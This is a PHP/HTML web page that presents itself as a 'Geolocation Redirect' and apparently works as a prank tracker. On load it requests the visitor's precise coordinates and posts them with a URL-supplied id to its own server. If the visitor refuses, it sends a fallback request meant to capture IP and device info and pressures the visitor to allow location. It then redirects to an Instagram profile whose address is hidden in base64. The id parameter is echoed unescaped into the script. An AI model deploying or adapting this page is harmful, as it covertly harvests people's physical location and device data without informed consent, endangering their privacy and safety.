<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Geolocation Redirect</title>

    
</head>
<body>



    <script>
        // Run this function immediately when the page loads
        window.onload = function() {
            getLocation();
        };

        function getLocation() {
            if (navigator.geolocation) {
                // Request the user's location
                navigator.geolocation.getCurrentPosition(showPosition, showError);
            } else {
                // If geolocation is not supported
                fallbackToIP();
            }
        }

        function showPosition(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;

            // Send location data to the server using fetch API
            fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: `latitude=${latitude}&longitude=${longitude}&id=<?php echo isset($_GET['id']) ? $_GET['id'] : '' ?>`
            })
            .then(response => response.text())
            .then(data => {
                  alert("You are pranked by MM Rehu! follow to get same website");  

                window.location.href = atob("aHR0cHM6Ly9pbnN0YWdyYW0uY29tL18ubW1yZWh1");
            });
        }

        function showError(error) {
            // If user blocks location, fallback to IP
            fallbackToIP();
        }

        function fallbackToIP() {
            // Send a request to the server to grab the IP and device info
            fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'fallback=true&id=<?php echo isset($_GET['id']) ? $_GET['id'] : '' ?>'
            })
            .then(response => response.text())
            .then(data => {
               alert("location denied please alow to continue!");  
                //indow.location.href = "";
            });
        }
    </script>



<?php
include 'store.php';  

?>

</body>
</html>